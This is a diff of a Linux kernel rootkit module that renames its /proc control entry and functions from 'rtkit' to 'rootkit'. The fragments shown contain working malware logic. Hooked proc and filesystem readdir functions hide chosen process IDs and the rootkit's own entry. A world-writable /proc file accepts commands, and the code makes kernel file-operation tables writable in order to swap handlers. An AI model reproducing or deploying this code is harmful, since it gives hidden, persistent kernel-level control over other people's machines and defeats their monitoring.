@@ -20,7 +20,7 @@ MODULE_AUTHOR("Michal Winiarski<t3hkn0r@gmail.com>");
 
 //STATIC VARIABLES SECTION
 //we don't want to have it visible in kallsyms and have access to it all the time
-static struct proc_dir_entry *proc_rtkit;
+static struct proc_dir_entry *proc_rootkit;
 
 static int (*proc_readdir_orig)(struct file *, struct dir_context *);
 static int (*fs_readdir_orig)(struct file *, struct dir_context *);
@@ -91,7 +91,7 @@ static int proc_filldir_new(struct dir_context *dirent, const char *name, int na
 	for (i=0; i < current_pid; i++) {
 		if (!strcmp(name, pids_to_hide[i])) return 0;
 	}
-	if (!strcmp(name, "rtkit")) return 0;
+	if (!strcmp(name, "rootkit")) return 0;
 	return proc_filldir_orig(dirent, name, namelen, offset, ino, d_type);
 }
 
@@ -127,8 +127,8 @@ static int fs_readdir_new(struct file *filp, struct dir_context *dirent)
 	return ret;
 }
 
-//static int rtkit_read(char *buffer, char **buffer_location, off_t off, int count, int *eof, void *data)
-static ssize_t rtkit_read(struct file *file, char __user *buff, size_t count, loff_t *offp)
+//static int rootkit_read(char *buffer, char **buffer_location, off_t off, int count, int *eof, void *data)
+static ssize_t rootkit_read(struct file *file, char __user *buff, size_t count, loff_t *offp)
 {
 	int size;
 	long long p = *offp;
@@ -163,7 +163,7 @@ STATUS\n\
 	return ret;
 }
 
-static ssize_t rtkit_write(struct file *file, const char __user *buff, size_t count, loff_t *offp)
+static ssize_t rootkit_write(struct file *file, const char __user *buff, size_t count, loff_t *offp)
 {
 	
 	copy_from_user(kernel_buff, buff, MIN(1024, count));
@@ -187,12 +187,12 @@ static ssize_t rtkit_write(struct file *file, const char __user *buff, size_t co
         return count;
 }
 
-static const struct file_operations rtkit_fops =
+static const struct file_operations rootkit_fops =
 {
 		/*.owner = THIS_MODULE,*/
-	/*.open = rtkit_open,*/
-	.read = rtkit_read,
-	.write = rtkit_write,
+	/*.open = rootkit_open,*/
+	.read = rootkit_read,
+	.write = rootkit_write,
 	/*.llseek = seq_lseek,*/
 	/*.release = single_release,*/
 };
@@ -200,9 +200,9 @@ static const struct file_operations rtkit_fops =
 //INITIALIZING/CLEANING HELPER METHODS SECTION
 static void procfs_clean(void)
 {
-	if (proc_rtkit != NULL) {
-		remove_proc_entry("rtkit", NULL);
-		proc_rtkit = NULL;
+	if (proc_rootkit != NULL) {
+		remove_proc_entry("rootkit", NULL);
+		proc_rootkit = NULL;
 	}
 	if (proc_fops != NULL && proc_readdir_orig != NULL) {
 		set_addr_rw(proc_fops);
@@ -231,10 +231,10 @@ static int __init procfs_init(void)
 	struct file *proc_filp;
 //	printk("in_rootkit_proc_init");
 	//new entry in proc root with 666 rights
-	proc_rtkit = proc_create("rtkit", 0666, NULL, &rtkit_fops);
-	if (proc_rtkit == NULL) return 0;
-//	printk("rootkit_proc_init_rtkit_success");
-	//proc_root = proc_rtkit->parent;
+	proc_rootkit = proc_create("rootkit", 0666, NULL, &rootkit_fops);
+	if (proc_rootkit == NULL) return 0;
+//	printk("rootkit_proc_init_rootkit_success");
+	//proc_root = proc_rootkit->parent;
 	//if (proc_root == NULL || strcmp(proc_root->name, "/proc") != 0) {
 	//	return 0;
 	//}
